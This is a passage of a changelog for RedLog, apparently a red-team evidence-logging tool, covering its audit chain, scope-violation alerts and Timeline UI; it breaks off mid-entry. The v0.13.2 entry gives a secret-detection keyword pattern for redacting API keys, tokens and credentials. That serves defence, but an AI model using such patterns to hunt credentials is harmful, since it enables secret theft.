# CHANGELOG

RedLog release history. Each entry links to the tag; run `gh release view v0.6.x`
for full commit body + generated notes.

## v0.14.2 — 2026-08-19

**§9.4 StatusBar tier counter opens the auditor view.** The chained ·
logged row counter is now clickable — one click toggles the Timeline's
auditor-view chip. Third landing across the two-tier UI surface:
v0.14.0 (per-row badge) → v0.14.1 (auditor chip) → v0.14.2 (StatusBar
click-through).

- Counter becomes a `<button>` when the logged tier is non-zero.
  Dispatches `redlog:auditor-view:toggle`; Timeline's listener flips
  its own state, persisting via the existing scoped-localStorage
  writer.
- Zero-logged projects stay as a plain span — no click affordance
  (matches the chip's disabled-state design; nothing to hide → clicking
  would be a no-op).
- Tooltip warns "Timeline must be open for the click to take effect" —
  the listener only registers while Timeline is mounted. Clicking from
  Dashboard is a documented silent no-op rather than a cross-cutting
  state-lift refactor.
- Zero-config change to the visible label, format, or layout.

Still deferred to a follow-up (or v1.0.0):
- §9.5 Settings chain-health card — logged-count + last-fed timestamp
  under the existing chain-integrity readout.

PR #14.

## v0.14.1 — 2026-08-19

**§9.2 auditor-view filter chip** — new "⛓ Auditor (N)" chip in the
Timeline toolbar. Toggle on → hides logged-tier rows (DNS/HTTP/browser
console/agent-thinking heartbeats) so the chained (audit) chain is what
the reviewer sees. Closes the §9.2 loop after v0.13.0 (two-tier chain),
v0.13.1 (detail-panel badge), v0.14.0 (per-row badge).

- Off by default per spec — operators want to see everything; auditors
  flip it on before review.
- Per-project scoped like the other filters (anomaly, focus-anchor,
  hidden-lanes, filter-query). Legacy-key migration on first project
  open, matching the v0.6.98/v0.6.99 pattern.
- Disabled at 0.25 opacity when there are no logged rows to hide AND
  it's off; stays clickable when active so operators can turn it off
  after all logged rows scroll out.
- Missing-tier fallback treats a row as chained (matches v0.14.0's
  TierBadge convention + what the audit chain contains on disk), so
  historical pre-v0.13 rows survive.
- i18n keys in en.json + zh-TW.json.

Still deferred to a follow-up (or v1.0.0):
- §9.4 StatusBar click-through (row count opens the chip)
- §9.5 Settings chain-health card (logged-count + last-fed timestamp)

Dogfood-verified from both dev build + shipped DMG. PR #13.

## v0.14.0 — 2026-08-19

**Timeline classifier now visible on every row.** Closes the §9.1 spec
deviation flagged during the v0.13 code review — v0.13.1 shipped the
tier badge in the detail panel only, so reviewers scrolling the timeline
had to click each row to check whether it was `chained` (audit chain,
signed, anchored) or `logged` (supporting evidence).

Now every event row carries a hair-thin `⛓` (chained) or `⌇` (logged)
glyph right after the timestamp, matching the design doc placement.
Chained rows render zinc-700 (very subtle — 99%+ of rows are chained
and shouldn't fight for attention); logged rows get zinc-400 so the
exception stands out at a glance.

The detail-panel chip (icon + label) is unchanged; both variants now
share one `TierBadge` component so the classes and tooltip can't drift
apart. Missing-tier fallback: pre-v0.13.0 rows are rendered as chained,
matching what the audit chain actually contains.

No behaviour change to the DB, IPC contract, or existing events —
purely a Timeline UI polish. PR #12.

Still deferred to a later v0.14 point release (or v1.0.0):
- §9.2 auditor-view filter chip
- §9.5 Settings chain-health card (logged count + last-fed timestamp)
- §8.3 bundle manifest fields (`pruneWatermark`, `retentionPolicy`)
- `retention.loggedTier.maxSizeGb` / `maxRowCount` ceiling wire-up

## v0.13.2 — 2026-08-19

**Six code-review fixes that landed across the three v0.13 PRs.** Two real
bugs, two dead-code deletions, two API-surface honesty passes. Full
review report on PRs #9 / #10 / #11.

### PR #9 (alert subsystem, `70a43a9` + `f099a27`)

- **`surface.ts` — `ip_verdict_kind` was writing the union discriminator
  (`v.kind`, always `'ip'`) instead of the classified value (`v.value`).**
  Every `ip_verdict` event silently landed with the same literal string.
  Downstream filters that keyed on the field (StatusBar badge tooltip,
  scope-adherence, v0.13 tier classifier) saw one bucket where there
  should have been five. Regression covered by
  `test/alert/ip-event-fields.test.ts`.
- **`secret-redaction.ts PREFILTER_RE` — a literal space in the `[=: ]`
  char class matched every prose sentence** and fell through to all
  eight regex passes, defeating the 90%-skip claim on the common path.
  Prefilter is now keyword-based (`api[_-]?key|token|password|bearer|
  AKIA|sk[-_]|BEGIN|eyJ|ghp_|glpat`) — a strict superset of every
  pattern, verified entry-by-entry.
- Deleted dead `AlertRuntime.onScopeVerdict` (no callers, leaked a
  no-op unsubscribe on a permanently-registered surface) and a shadowed
  local `type Authority` in `surface.ts`.
- Test tolerance: `test/hooks-manager.test.ts` unblocked from a pre-
  existing main-branch failure (mitmproxy install-guidance step added
  in commit `1645578`; asserted on `manualSteps[0]` where CI runners
  now see install-first).

### PR #10 (two-tier chain, `e9ac624`)

- **Deleted the unreachable `isLoggedTierIPVerdict` classifier branch.**
  Design doc §4.1 promised heartbeat routing (`ip_verdict_kind ===
  'unchanged'` → logged), but `IPPolicy.evaluate` at `policies.ts:143`
  dedups unchanged verdicts and never emits one — the branch was dead.
  Every `ip_verdict` that reaches `insertEvent` is a real state change
  and correctly falls through to the chained default.
  `test/db/tier-classifier.test.ts` rewritten to lock the new truth.
- **`REDLOG_LOGGED_RETENTION_DAYS=""` empty-string guard.** Prior code
  did `Number('') === 0`, passed `Number.isFinite && >= 0`, and silently
  switched to keep-forever — the exact silent-typo-vaporises-tier
  failure §7.2 wanted to avoid. Empty string now falls through to
  config default.
- **Dropped `maxSizeGb` + `maxRowCount` from `retention.loggedTier`
  config surface.** `sweepLoggedTier` reads only `keepDays`; an
  operator who set the ceilings got a silent no-op. Design §7.1
  reserves them for a follow-up; better to not surface a promise the
  code doesn't keep.

### PR #11 (two-tier UI polish, `752e6dd`)

- **`EventTier` + `EventTierFilter` shared type alias.** The
  `'chained' | 'logged' | 'all'` union was redeclared inline in five
  places (main / preload / env.d.ts / StatusBar / IPC handler). Now
  exported from `src/core/db/events.ts` and referenced via
  `import(...)` types at each boundary.
- **StatusBar tooltip formatter consistency.** Chained count uses i18n
  and logged count uses `.toLocaleString()`; the `title` tooltip used
  raw template literals without thousands separators. Tooltip now
  reads `1,234 chained · 89,201 logged` uniformly with the on-screen
  render.

### Deferred (v0.14 or v1.0.0)

- §9.1 per-row Timeline tier badge (currently detail-panel-only)
- §9.5 Settings chain-health readout (logged count + last-fed
  timestamp)
- §10.4 retention first-run banner (silent-prune-on-upgrade concern
  is muted because `events_logged` starts empty on migration, so the
  first sweep is a no-op)
- §8.3 bundle manifest fields (`pruneWatermark`, `retentionPolicy`)
- `maxSizeGb` / `maxRowCount` ceiling wire-up + summary event fields
- Extra spec tests: §11.3 verify-ignores-logged, §11.5 cross-tier
  `_causes` links, §11.7 schema drop-and-recreate, §12.9 sweep-during-
  export WAL isolation

## v0.13.1 — 2026-08-19

**Two-tier UI polish** — the audit-story visibility promised by v0.13.0.

- **StatusBar chained · logged split.** Row-count tick shows both tiers
  when logged is non-zero (`8,142 · 190,341`) with a hover tooltip that
  spells out "chained (audit chain) · logged (supporting evidence)".
  Pre-v0.13 projects with an empty logged tier still show the
  single-number shape they always had — no visual change until the
  first mitmproxy scan writes to `events_logged`.
- **Timeline detail-panel tier badge.** Selecting an event surfaces
  `⛓ chained` or `⌇ logged` next to the operator label. Tooltip
  explains the semantic ("hash-chained, signed, anchored" vs
  "supporting evidence — not hash-chained, not signed, not covered
  by the OTS anchor"). Answers the reviewer question "why isn't this
  row signed?" without them needing to read the docs.
- **`events:getCount` IPC extended** with optional `tier`
  (`'chained' | 'logged' | 'all'`). Preload + env.d.ts contract
  updated; legacy no-arg callers unchanged (still returns the chained
  count — every existing StatusBar / API / MCP call means that).
- **Live count updates**: `events.onNew` handler now inspects the
  incoming event's `tier` field to bump the correct counter.

Deferred to v0.14: auditor-view filter chip (Timeline shows chained
only when active), `redlog-cli --tier` flag. Both are additive on top
of the shipped v0.13 backend.

## v0.13.0 — 2026-08-19

**Two-tier evidence chain.** The audit chain now has a clearer story.

Shell commands, agent turns, markers, loot, cleanup, pivots, and scope
violations continue to be hash-chained, Ed25519-signed, and OTS-anchored —
the **chained** tier, primary evidence. DNS lookups, HTTP flow bookkeeping,
CDP console messages, agent thinking, and alert-bus heartbeats now write to
a separate `events_logged` table — the **logged** tier, supporting footprint.

Bundles carry both as separate files (`events.jsonl` + `events_logged.jsonl`);
the verifier walks the chained tier only. The audit story stops asking the
reader to take every DNS heartbeat as seriously as every shell command.

Design docs (already committed on PR #9): [`DESIGN-two-tier-chain.md`](docs/DESIGN-two-tier-chain.md) + [`DESIGN-logged-tier-retention.md`](docs/DESIGN-logged-tier-retention.md).

### Phase 1 — core (`794873d`)

* Schema: additive `CREATE TABLE events_logged` + 5 indexes. No append-only
  trigger by design — retention is a first-class DELETE.
* Classifier: `classifyTier(agentType, data)` — 12 logged tuples + the
  `system.ip_verdict` data-dependent special case (`unchanged` tick → logged;
  any other kind → chained real state change).
* Dispatch: `insertEvent` splits into `insertChainedEvent` (unchanged
  historical body — every existing invariant preserved) + `insertLoggedEvent`
  (short path, no hash / sign / dedup / clock-check).
* Read: `queryEvents({ tier })` UNION ALL; `queryEventById` checks both
  tables (chained-first on collision); `getEventCount({ tier })` (default
  `chained` for anchor callers).
* Row shape: `RedLogEvent.tier?: 'chained' | 'logged'`; `rowToEvent`
  stamps from SELECT hint.
* Capture-health: `lastEventFor` takes max of both tables (mitmproxy on
  logged tier would otherwise show as `idle`).

### Phase 2a — bundle export (`4f6ab6c`)

* `bundle-export.ts` writes a new `events_logged.jsonl` in insertion order,
  sanitization swaps apply, sha256 lands in `manifest.files`.
* `bundleVersion` bumped 1 → 2. `manifest.tiers = { chained, logged }`
  populated from head + logged count.
* Bundled README explains the primary/supporting split.
* `tools/redlog-verify.py` recognises `bundleVersion`, detects
  `events_logged.jsonl`, reports its row count with the "not verified —
  supporting evidence" note. v1 bundles verify unchanged.

### Phase 2b — retention (this commit)

* `sweepLoggedTier(cfg, ids)` in `retention.ts` — age-based DELETE keyed
  on `created_at` (clock-drift-immune). Batched (5000-row) so a 40 GB
  sweep doesn't stall WAL. Respects `eventBus.paused` for symmetry with
  insertEvent. Fires one chained `system.retention_pruned_logged` summary
  on `count > 0` (mirrors `cast_pruned` non-empty convention).
* Config: `retention.loggedTier.{ keepDays, maxSizeGb?, maxRowCount?,
  sweepIntervalHours }`. Default `keepDays: 30` — the first non-zero
  retention default RedLog ships (design §4.2: logged is the first
  non-primary artifact, so 30d is not policy inconsistency).
* Env override: `REDLOG_LOGGED_RETENTION_DAYS` for CI / air-gapped.
* main/index.ts runs the sweep on project open AND on a periodic 24h
  timer (design §5.1: cast/screenshot sweep runs only on open, but
  logged-tier can grow 20-40 GB DURING a nine-hour day).
* `stopProject` clears the timer.

### Behavioural invariants preserved

- **Chain integrity across interleaved tiers** — locked in
  `logged-insert.test.ts`: chained row B's `prevHash` still equals chained
  row A's `hash` after 3 logged rows in between.
- **Anchor count semantics** — `getEventCount()` still defaults to
  chained-only. The chain-anchor code path is untouched. `verifyChainFull`
  still walks `events` only.
- **Legacy rows** — every pre-v0.13 row stays chained, verifies under the
  same shape ladder. Zero data migration.

### Test coverage (+39 tests, 630/630 green)

* `test/db/tier-classifier.test.ts` — 12 cases: chained defaults, every
  logged tuple, ip_verdict data-dependence, fail-safe unknown
* `test/db/logged-insert.test.ts` — 7 cases: dispatch to correct table,
  logged row shape, chain event count stays chained-only, chain
  integrity survives interleaved logged inserts, queryEvents union,
  queryEventById tier-first, operator required
* `test/bundle-two-tier.test.ts` — 6 cases: both files present,
  bundleVersion + tiers, logged rows have no chain columns, empty
  tiers bundle, README explains split, manifest.files entry
* `test/retention-logged-tier.test.ts` — 11 cases: empty no-op, keepDays=0
  no-op, age-based delete, summary event fires on count > 0, does NOT fire
  on count = 0, chain table untouched, respects pause, env override,
  batched delete over 100 rows, no operator = no-op, summary has no
  `_causes`

### What ships (Phase 2c / UI) deferred to v0.13.1

- Timeline tier badge (⛓ / ⌇), auditor-view filter chip, StatusBar
  row-count split. These are UI-only follow-ups; the core audit story
  is complete at v0.13.0.
- `redlog-cli` `--tier` flag on query / export commands.



## v0.12.2 — 2026-08-18

**Four more wins from the audit + a design doc for v0.13's two-tier chain.**

### 1. `eventBus.publish` fanout deferred via `queueMicrotask`

Before: publish synchronously called every listener on the writer's stack —
renderer IPC broadcast + deconfliction webhook + AlertBus surface fan-out
(4 policies × 5 surfaces in the v0.12.0 shape). Any listener that did real
work (webhook fetch queue, IPC serialize) charged the caller for it.

After: publish schedules the fanout via `queueMicrotask`. Caller returns
immediately after the DB insert; listeners drain on the next microtask
tick (still same event loop turn, before I/O). Ordering between two
`publish()` calls is preserved (microtasks are FIFO). Pause check stays
synchronous — a listener joining mid-microtask must still see the same
"paused" state the writer saw.

Zero visible change; removes a latent stacking hazard as more subscribers
land.

### 2. `secret-redaction` prefilter

Before: `redactSecrets` ran 8 regex `.replace()` calls on every string —
including plain-prose agent turn bodies. At 100 tool_result turns per
minute that's 800 wasted regex passes.

After: one anchored regex tests for any pattern-trigger substring
(`=`/`:`/space/`AKIA`/`sk-`/`sk_`/`BEGIN`/`eyJ`/`ghp_`/`glpat`); if none
present, skip the 8 passes entirely. Golden-input parity preserved (17
existing fixtures still pass); +2 tests: prefilter fast path + regression
guard that every real secret still redacts (catches a future prefilter
tightening that silently drops a pattern).

### 3. `deepRedactStrings` per-tool allowlist (`redactToolInput`)

Before: `tool_call` events ran `deepRedactStrings` over the ENTIRE
`tool_input` tree on every turn — including `Read`'s numeric `offset`/`limit`
and `file_path` (path strings never contain the secrets we scan for).

After: `TOOL_INPUT_SCAN_FIELDS` maps `toolName → Set<field>` of which
top-level fields need scanning. `Read`/`Glob` scan nothing (all metadata);
`Bash` scans only `command`; `Edit` scans `old_string`+`new_string`;
`WebFetch` scans `prompt`. Unknown tools fall back to full-tree scan (safe
default). New `redactToolInput(toolName, input)` helper. +9 tests.

### 4. Timeline `maxZoom` + `timeStart/timeEnd` sorted-array fast path

- `timeStart`/`timeEnd`: `events` is already sorted by `eventCompare`, so
  min = `events[0].timestamp`, max = `events[last].timestamp`. Only markers
  with `atTimestamp` can point outside that window — scan only those
  (typically <20 rows) to widen the bounds. On a 131k-event project this
  drops from O(N) with a per-event `displayTs()` call to O(N) with just
  an `agentType` check + O(markers) work.
- `maxZoom`: inline `displayTs` (99%+ of events are non-marker so the
  function call was pure overhead), and short-circuit once the running
  tightest gap crosses the `MAX_TRACK_W` ceiling — no denser gap can
  raise the zoom ceiling.

### Design doc: `docs/DESIGN-two-tier-chain.md` (v0.13 preview)

831-line doc for the two-tier evidence chain landing in v0.13. Recommends
a separate `events_logged` table (over a `chained BOOLEAN` column) so the
append-only triggers on `events` stay inviolate. Includes tier
classification for every real `(agent_type, subtype)` in the codebase, the
`_causes` cross-tier rule (allowed — soft pointer), verifier / export
bundle / renderer changes, migration story, and open questions
(plugin-contributed default tier, logged-tier retention, webhook forwarding).
Not implementation — decision point before v0.13.

## v0.12.1 — 2026-08-18

**Three real perf wins that were hiding in the write path.**

A performance audit (see `docs/PERF_AUDIT_v0.12.md` if it exists — otherwise
the branch history) surfaced three concrete defects. All three ship together.

### 1. `signEvent` re-reads the operator's key file on every insert (**biggest**)

Every `insertEvent` was doing 2× `fs.existsSync` + 2× `fs.readFileSync` + JWK
parse of both key halves — purely to re-load the operator's key file **that
we ourselves had just written**. At a 200 evt/s mitmproxy burst that was
~800 syscalls/s + 200 `crypto.createPrivateKey` calls, dominating the sign
latency at ~50 µs when the raw Ed25519 sign itself is ~15 µs.

Fix: per-operator `KeyObject` cache in `signing.ts`. Cache hit path is bare
Ed25519. `generateOperatorKeyPair` invalidates any prior negative-cached
entry for the same id. New `resetSigningCache(operatorId?)` export for
callers that rotate keys or wipe the keys dir. **7 new tests** cover the
positive path, negative caching, cache invalidation, and the
generate-after-negative-cache case.

Expected impact: **sign latency ~50 µs → ~15 µs**; reclaims ~7 ms/s of
main-thread time at 200 evt/s and drops ~400 syscalls/s.

### 2. `redact()` re-compiled every denylist regex per token

`matchesAny` compiled `new RegExp(p.slice(1, -1))` inside its inner loop.
With a 20-entry regex denylist × 100 tokens per shell command_end stdout
(the size a real `redlog-run` output easily reaches) that was **2000 fresh
`RegExp` constructions per event**. `effectiveRules` also allocated two
arrays + two `Set`s per `getRules()` call.

Fix: cached `CachedRules` in `redaction.ts` holds precompiled patterns for
both allowlist and denylist. Cache invalidates on `configureRedaction` /
`registerRedactionRules` / `unregisterRedactionRules`. Callers that pass a
NEW rules object (api-server merges `lootValues` into the denylist per
shell event) compile those local lists **once** at redact-time, not per
token. **6 new tests** cover literal/regex denylist, allowlist precedence,
cache invalidation on all three write paths, and the per-call rules-object
path api-server actually uses.

### 3. Timeline `recentEvents` walked the whole event array to look at the last 50

`events.filter(...).reverse().slice(0, 50)` scans N events, filters M into
a new array, reverses that whole M-element array, then throws away all but
the last 50. On a 131k-event project that paid O(N) every render just for
the tail. Because `view.left`/`view.width` are in the memo's dep list,
this ran on every scroll frame while the operator dragged the timeline.

Fix: walk from the tail and short-circuit at 50 matches. The
scrolled-window path also short-circuits at `d < from` (events are
time-sorted, so nothing older will be in-window). Empty-window fallback
preserved.

Expected impact: **~500 µs → sub-µs** per render at 131k events.

### Deferred to later (mentioned in the audit, not urgent)

- `mitmproxy-addon.py` thread-per-request → single queue + keep-alive
  HTTPConnection. Real audit trap (slow RedLog stalls the proxy) but
  needs Python addon work; separate PR.
- Timeline `maxZoom` / `timeStart` full-array scans → maintain running
  min during binary-insert; medium value.
- `deepRedactStrings` whole-tree walk on every tool_call → per-tool
  field allowlist; medium value.
- **Two-tier chain** (`chained` vs `logged` events) — a design change,
  not a defect fix. Worth a design doc for v0.13 or v1.0. Current write
  path handles our real workload (200 evt/s peak) comfortably; the tier
  system is about audit-story honesty (a DNS storm isn't sworn to; the
  shell command that fetched it is) more than throughput.

## v0.12.0 — 2026-08-18

**Alerts stop being two hand-wired monitors and start being a subsystem.**

Before: `ip-monitor.ts` and `scope-monitor.ts` each carried their own classify()
+ their own emit path + their own state. Adding a new alert kind meant copying
the shape and wiring a third monitor into main by hand. The second time that
happened it stopped scaling.

Now: **producers → bus → policies → surfaces**. Producers observe
(`IPSignalProducer` polls the address; the shell/http/dns/agent-tool lanes hand
a `TargetHitSignal` to the bus). Policies classify (`IPPolicy` maps to five
verdict values, `ScopePolicy` to a four-rung distance ladder). Surfaces do side
effects (`ChainEmitter` writes the audit event, `BadgeSurface` drives the
StatusBar, `WebhookForwarder` posts to deconfliction, `AdherenceCounter` tallies
the "247 targets, 244 in scope" report, `ViolationLog` feeds the ScopePanel).

Two new alert kinds land at the same time, because the subsystem finally makes
them cheap: `CombinedPolicy` escalates when a non-clean IP verdict and a
non-clean Scope verdict co-occur within 30s (the two ways an engagement can go
sideways at the same moment); `BurstPolicy` collapses N-in-T scope hits of the
same distance into a single burst signal (a 200-request scan doesn't turn the
badge into a strobe light).

The vocabulary is imported cleanly from ea's `ALERT-ROLES.md` — every verdict
declares an **authority tier** (`fact` / `inferred` / `unknown`) so a whitelist
miss (fact) never gets silenced by a preference toggle that's supposed to
suppress inferences, and the five-verdict IP matrix means the A-9 false-green
bug (blacklist configured, no whitelist, IP misses both → the old code
mislabelled that as `safe`) is no longer reachable.

* `src/core/alert/` — the whole subsystem in five files (`signal`, `policy`,
  `policies`, `surface`, `bus`) plus `index` — public exports only from `index`
* `src/main/services/producers/ip-signal-producer.ts` — polls external + local
  address, holds the 3-in-a-row confirmation window, dispatches every tick
* `scopeSignalFor(agentType, data)` in `api-server.ts` routes every incoming
  event to a `TargetHitSignal` when it carries a checkable host — shell
  `command_start` (source=shell), scanner `http_request_start` (source=http),
  dns `dns_query` (source=dns). Everything else no-ops.
* `configureAgentTailer({ scopeDispatch })` hook — the tailer extracts a
  target from every `agent.tool_call`'s `tool_input` (URL parsed for
  hostname, shell-shaped strings through the target-extractor, absolute
  paths + free text skipped) and hands it to the alert bus with
  source=agent_tool. This closes the last silent lane: a Claude session
  hitting an out-of-scope host now shows up in the scope report
* `src/main/services/alert-runtime.ts` — one convenience wrapper that bundles
  bus + policies + surfaces + producer; main sees `alertRuntime.configure(cfg)`
  and doesn't touch the internals
* 42 unit tests locking the five-verdict matrix, D1-D4 ladder, combined
  correlation window, burst cooldown, bus dispatch + error isolation +
  derived-policy recursion cap
* **Deleted**: `src/core/ip-monitor.ts`, `src/core/scope-monitor.ts`,
  `test/ip-monitor.test.ts`, `test/ip-monitor-dns.test.ts`,
  `test/scope-monitor.test.ts`

**Semantic changes** (visible in the chain):
* `system.ip_transition` events are gone — `system.ip_verdict` replaces them,
  written once per real verdict change with `authority` + `severity` + verdict
  value + modifiers (`settling`, `stale`, `list_conflict`) as first-class
  fields
* `system.scope_violation` gains `distance` (`in_scope` / `excluded` /
  `adjacent_subnet` / `adjacent_domain` / `unrelated`) and `authority` — old
  events had `reason: 'excluded_target' | 'out_of_scope'` only
* `system.combined_alert` and `system.burst_alert` are new event subtypes

**Behaviour changes** (visible in the UI):
* The StatusBar's tricolor badge (green/amber/red) maps from five verdicts:
  `safe`/`presumed_safe` → green, `off_profile`/`exposed` → red, `unknown` →
  amber. Same shape you're used to; the underlying vocabulary is richer
* Chain integrity is not verified across this refactor — v0.12.0 pre-release,
  the user waived the invariant. Nothing in production yet.

## v0.11.7 — 2026-08-10

**The Timeline stops recomputing everything sixty times a second.**

### 1. Per-batch work (W19)

Every incoming batch replaces the events array, which invalidates every memo on
the panel. Measured on a real 131,833-event project:

| | |
|---|---|
| `searchIndex` | **126 ms** |
| `effectsById` | 33 ms |
| `laneEvents` | 18 ms |
| `maxZoom` | 11 ms |
| **per flush** | **~191 ms** |

Scheduled on `requestAnimationFrame`, so the panel was being asked for 191 ms
of work sixty times a second. It spends every frame recomputing and none of it
painting.

**The search index is now built only while a filter is active.** It was the
most expensive thing on the panel by a factor of three — nine string coercions,
a join, a lowercase and an `eventTitle()` call per event — and it ran whether
or not anything was being filtered, which is almost always. One comparison when
idle; unchanged when typing, since the query is already debounced.

*(The comment there claimed this was "cheap for ≤ 5k events" and that the dim
path dominated above that. At 131k it dominated everything. Measured, not
assumed — the note has been corrected.)*

**Flushes coalesce once the set is large.** Under 5,000 events a frame-accurate
flush is imperceptible and worth keeping: a live tail should look live. Above
it, ~4 Hz costs at most a quarter-second of staleness on a view whose own
freshness badge counts in seconds, and hands the frames back.

Together: **191 ms → 68 ms per flush**, at 1/15th the rate.

### 2. Session band labels stopped stacking (V11)

Every band drew its label at its own top-left, so two terminals open at once —
a shell and a listener, the normal case — put both labels in the same few
pixels and neither was readable.

Overlapping bands are now assigned rows by greedy interval colouring over their
x-order, with a label's width of clearance rather than just the band's, so the
text doesn't collide either. Non-overlapping bands all stay on row 0, which is
the common case. A band too narrow to hold its label drops it — a 60px label
bleeding out of a 4px band is worse than none.

### Tested

- 541/541 unit (+5). `test/timeline-flush.test.ts` asserts the guard sits
  *before* the loop, that the index still rebuilds when the query changes
  (making it lazy without that dep would leave it empty forever), and the
  band-row colouring. All properties that regress silently.
- 47/47 E2E.

## v0.11.6 — 2026-08-10

**The last four Timeline presentation findings.** AUDIT's presentation tier is
now closed.

### 1. Idle stretches can be skipped (V7)

Time on the track is strictly linear, which is honest but wastes the screen: a
two-hour lunch takes the same width as two hours of contact, so thirty minutes
of dense work gets a tenth of the track and most of it shows nothing. Zooming
in to read the burst then scrolls its context off the sides.

A **skip idle** chip collapses any stretch longer than ten minutes with no
events down to 48px, drawn as a hatched break carrying its duration — `⋯2h15m`.
Everything else keeps its proportion.

**Off by default, and visibly on when enabled.** A compressed axis is no longer
proportional, and for an audit tool "the gap you are looking at is not to
scale" has to be the operator's explicit choice, announced on screen. A
discontinuity the operator cannot see would be worse than the space it
reclaimed, because every later reading of the axis would be silently wrong.

Two implementation notes worth recording, both found by driving it:

- **Gap detection runs whether or not compression is on.** Gating it on the
  toggle made the chip that turns it on unreachable — it only renders when
  there is something to compress.
- **The viewport is re-anchored across the toggle.** `TRACK_W` does not change
  when compression flips, so a fixed `scrollLeft` would leave the operator
  looking at empty track while everything moved beneath it. The centre
  timestamp is captured and restored.

All six screen→time conversions now go through a shared `fromX`, the inverse
of the same piecewise mapping the track draws with.

### 2. The track fills the window (V8)

`BASE_TRACK_W` was a flat 2000px, so at zoom 1 a 2560px or 4K display got a
track narrower than the space available and a band of empty panel beside it.
It is now a floor: `max(2000, container)`. A wide window shows more time
instead of more nothing.

### 3. Dense bursts can be pulled apart (V13)

The zoom ceiling was a flat 6. A burst of thousands of events inside one second
— a scanner run, an agent tool loop — collapses into a single cluster, and no
amount of zooming could separate it: the popup lists 50 and **the rest were
unreachable through the UI entirely**. They were in the chain and in the
export, just not viewable.

The ceiling now derives from the tightest gap between two events in the same
lane: enough zoom to put a cluster width between them. Sparse projects keep a
ceiling near 6 — there is nothing to gain — and a dense burst raises it as far
as that burst needs. Viewport virtualisation (v0.11.1) is what makes a wider
track affordable.

### 4. Event dots are reachable by keyboard (V9)

They were plain `div`s with a click handler: no role, no label, no tab stop.
The existing ↑/↓ walk only engaged **after** a mouse click had already selected
something, so a keyboard-only operator could not reach the track at all, and a
screen reader saw nothing.

Now `<button>` with an `aria-label` carrying the timestamp, title and any
emphasis. Roving tabindex — only the selected dot (or the first, when nothing
is selected) is a tab stop — so Tab crosses the track in one press rather than
stepping through every visible node, and ↑/↓ takes over from there.

### Tested

- 536/536 unit (+9). `test/timeline-geometry-units.test.ts` asserts the
  geometry properties against the source: these regress silently — the app
  keeps working, it just wastes the screen or refuses to zoom — and staging
  them in E2E needs a 4K window and a thousand-event burst.
- 47/47 E2E (+3): the button role and roving tabindex, the chip appearing only
  when there is something to skip, and compression collapsing the gap while
  keeping the operator in place.

## v0.11.5 — 2026-08-10

**Opening a transcript-heavy project stopped stuttering.** One query, run once
per session instead of once per project.

### The tailer re-seeded its parent map per session

When a project opens, every agent session RedLog has ever seen re-registers so
the tailer can resume without duplicating history. Each registration ran:

```sql
SELECT id, json_extract(data,'$.transcript_uuid')
  FROM events
 WHERE agent_type = 'agent'
   AND json_extract(data,'$.session_id') = ?
   AND json_extract(data,'$.agent')      = ?
```

No index can serve a `json_extract` predicate, so each one scanned the whole
`agent` bucket. On a real engagement that bucket is 131,774 rows and the query
takes **167 ms** — and the project has **1,075 distinct agent sessions**.

**1,075 × 167 ms = 180 seconds of blocked main process**, synchronous, on open.
That is the stutter.

Building the same map in one pass takes **309 ms** for all 128,968 rows with a
`transcript_uuid`. Slices are handed to sessions and deleted as they are
claimed, so the index does not sit alongside the per-session maps it feeds, and
it is dropped in `stopHost()` — the project boundary — so ids from one
project's chain can never seed another's.

### On the other candidate

`recoverOrphanSessions` also runs on open and looked expensive. It is not:
2.9 ms on the same database. An earlier measurement of ~360 ms came from a
benchmark that reconstructed the query without its `agent_type = 'shell'`
filter, which made it scan all 131k rows instead of the 34 shell ones. The real
query was never the problem and was left alone.

`initDB` is ~600 ms on first open of an existing project — one-off index
creation for the composite and partial indexes added in v0.9.8 / v0.9.9, paid
once per database.

### Tested

- 502/502 unit (+4). `test/tailer-seed.test.ts` asserts the index hands each
  session exactly what the per-session query would, keys on agent as well as
  session so two agents never cross-seed, and that the cost is one scan rather
  than N — compared as a ratio, not a wall-clock threshold.
- 44/44 E2E.

## v0.11.4 — 2026-08-10

**The track now says what it means without being clicked.** Six presentation
findings from `docs/AUDIT-2026-08-08.md`, all of them about the Timeline
spending its visual budget on the wrong things.

### 1. Severity and scope violations were invisible (V3)

A `critical` marker rendered **identically** to an `info` one — severity
appeared only as a text prefix inside the tooltip — and a scope violation was
distinguished solely by being routed to its own lane, in a red byte-identical
to the marker lane's. Meanwhile chain integrity, which is rare and already
announced by a banner across the top, had a badge, a ring *and* a red band
behind it.

That is backwards for this product. The two things an operator scans a track
for are *did I go out of bounds* and *what did I flag as serious*.

Encoded as **shape**, not more colour — eighteen lane hues are already past
what anyone reliably distinguishes, and shape survives a colour-blind operator
and a glance at the far edge of the screen:

| | |
|---|---|
| scope violation | diamond, 25% larger — out of bounds is categorical |
| critical marker | hollow ring, 50% larger — reads as an outline |
| important marker | larger circle |
| everything else | circle |

The tooltip names the emphasis too, so shape is never the only channel.

### 2. Two lanes were the same colour (V1, V2)

`marker` and `scope` were both `#ef4444` — the two lanes an operator most needs
to separate — with `cleanup` a shade away. And the palette was raw Tailwind
values, so the track was the most saturated surface in an app that
deliberately desaturates everything else (`tailwind.config.js`: high
saturation on near-black vibrates).

Rebuilt so hue carries the lane **family** — execution, network, evidence,
findings, plumbing — and the red family is spread far enough apart to separate
side by side. Every value now sits inside the same desaturated band as the rest
of the app.

`test/lane-colours.test.ts` asserts the invariants: no duplicates, a minimum
pairwise distance, and a saturation ceiling. None of them are visible to a
rendering test — empty lanes auto-collapse, so the DOM never shows all eighteen
at once, which is exactly how two of them drifted into the same hex.

### 3. The event list ignored where you were looking (V5)

It showed "the last 50 events, always". Pan back three hours to investigate
something and the list underneath still showed what happened thirty seconds
ago — a break in the middle of the one workflow the panel exists to support.
It now follows the viewport, falling back to the tail when the whole track is
on screen, which is also what you want while following live.

### 4. Smaller things

- **Filtered-out dots were still clickable (V10).** They only lost opacity,
  keeping their full hit box, so clicking "nothing" opened a detail panel for
  an event the filter had just excluded — which reads as the filter being
  broken.
- **Cross-midnight axis labels (V6).** A three-day engagement showed several
  indistinguishable `09:11` ticks. Once the span crosses a day, the first tick
  and every tick that starts a new date carry the date.
- **`{n} Attack Timeline` (W13).** `timeline.title` was being used as a count
  noun in two places. `timeline.events` already existed.

### Tested

- 498/498 unit (+4, the palette invariants).
- 44/44 E2E (+3): the diamond, the severity sizes and fills, and the tooltip
  naming the emphasis.

## v0.11.3 — 2026-08-10

**`chain_sample_broken` root cause found. It was field order — nothing was
corrupt.**

Open since v0.7.5. The background sampler kept flagging a 2026-08-01
`system/ip_transition` row whose hash matched none of the six known shapes, and
v0.7.6 could only soften the symptom by showing the row's age so an operator
